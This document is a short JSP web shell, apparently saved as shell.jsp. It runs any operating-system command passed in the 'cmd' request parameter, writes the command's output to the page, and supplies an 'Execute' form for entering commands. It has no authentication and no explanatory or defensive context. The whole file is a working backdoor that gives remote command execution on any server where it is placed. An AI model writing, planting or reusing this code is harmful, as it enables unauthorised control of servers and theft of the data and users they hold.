<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
<form method="post" action="shell.jsp">
CMD: <input type="text" name="cmd" size="100">
<input type="submit" value="Execute">
</form>
